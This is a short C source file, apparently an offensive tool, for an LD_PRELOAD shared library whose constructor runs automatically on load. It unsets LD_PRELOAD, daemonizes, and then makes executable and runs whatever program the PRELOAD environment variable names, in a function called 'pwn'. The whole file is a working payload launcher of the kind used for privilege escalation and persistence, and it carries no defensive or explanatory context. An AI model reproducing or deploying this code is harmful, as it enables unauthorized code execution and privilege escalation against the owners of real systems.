/**
 * gcc preload.c -fPIC -shared -nostartfiles -m{arch} -s -o preload.so
 */
#define  _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <unistd.h>


void pwn(void) {
	chmod(getenv("PRELOAD"), 00777);
        system(getenv("PRELOAD"));
}

void daemonize(void) {
	signal(SIGHUP, SIG_IGN);
	if (fork() != 0) {
		exit(EXIT_SUCCESS);
	}
}

__attribute__ ((__constructor__)) void preloadme(void) {
  unsetenv("LD_PRELOAD");
  daemonize();
  pwn();
}

